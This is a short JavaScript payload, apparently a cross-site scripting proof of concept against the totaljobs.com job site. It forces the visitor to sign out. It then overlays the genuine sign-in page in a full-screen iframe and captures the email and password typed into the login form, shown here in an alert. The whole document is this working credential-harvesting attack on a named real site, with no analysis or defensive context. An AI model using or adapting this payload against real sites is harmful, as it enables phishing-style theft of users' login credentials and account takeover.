let img=new Image();img.src="https://www.totaljobs.com/account/signout";
window.setTimeout(()=>{
let iframe=document.createElement("iframe");
iframe.src="https://www.totaljobs.com/account/signin"
iframe. style="position: fixed; top:0; left:0; bottom:0; right:0; width: 100%; height:100%; border:none; margin:0; padding:0; overflow: hidden; z-index:999999;";
document.body.appendChild(iframe)
iframe.contentWindow.addEventListener("DOMContentLoaded", () => {
let loginbutton=iframe.contentWindow.document.getElementById("btnLogin");
loginbutton.onclick=()=>
{
let email=iframe.contentWindow.document.getElementById("Form_Email").value;
let pass=iframe.contentWindow.document.getElementById("Form_Password").value;
alert(`${email} : ${pass}`)
}

})
},3000)
